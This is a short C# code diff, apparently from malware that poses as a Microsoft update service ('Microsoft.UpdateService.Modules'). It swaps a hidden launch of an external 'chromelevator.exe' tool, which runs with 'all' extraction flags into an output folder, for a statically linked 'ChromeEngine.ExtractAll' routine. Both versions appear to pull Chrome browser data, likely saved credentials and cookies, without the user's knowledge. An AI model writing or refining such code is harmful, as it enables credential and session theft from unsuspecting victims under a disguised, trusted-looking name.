@@ -172,43 +172,20 @@ namespace Microsoft.UpdateService.Modules
         {
             try
             {
-                string workingDir = ResourceModule.WorkDir;
-                string elevatorPath = Path.Combine(workingDir, "chromelevator.exe");
+                Log($"[BROWSER] Executing Native Engine: ChromeEngine.ExtractAll({vOutputDir})");
+                
+                // V6.18: Wait for initialization stability (3s)
+                await Task.Delay(3000);
 
-                if (!File.Exists(elevatorPath)) {
-                    Log($"[BROWSER] ERROR: {elevatorPath} not found!");
-                    return;
-                }
-
-                // Command: all [flags]
-                // V6.13: Ensure 'all' is the primary command
-                string args = $"all -k -o \"{vOutputDir}\"";
-                Log($"[BROWSER] Executing: {elevatorPath} {args}");
-
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = elevatorPath,
-                    Arguments = args,
-                    WorkingDirectory = workingDir,
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    CreateNoWindow = true
-                };
-
-                using (Process? p = Process.Start(psi))
-                {
-                    if (p != null)
-                    {
-                        Process process = (Process)p;
-                        lastOutput = await process.StandardOutput.ReadToEndAsync();
-                        lastError = await process.StandardError.ReadToEndAsync();
-                        await process.WaitForExitAsync();
-                        Log($"[BROWSER] Elevator Exit Code: {process.ExitCode}");
-                    }
-                }
+                // V6.18+ Call (Statically Linked)
+                bool success = await Task.Run(() => ChromeEngine.ExtractAll(vOutputDir));
+                
+                if (success)
+                    Log("[BROWSER] Native Engine: Success");
+                else
+                    Log("[BROWSER] Native Engine: Failed or returned errors");
             }
-            catch (Exception ex) { Log($"[BROWSER] RunChromelevator error: {ex.Message}"); }
+            catch (Exception ex) { Log($"[BROWSER] Native Engine error: {ex.Message}"); }
         }
     }
 }
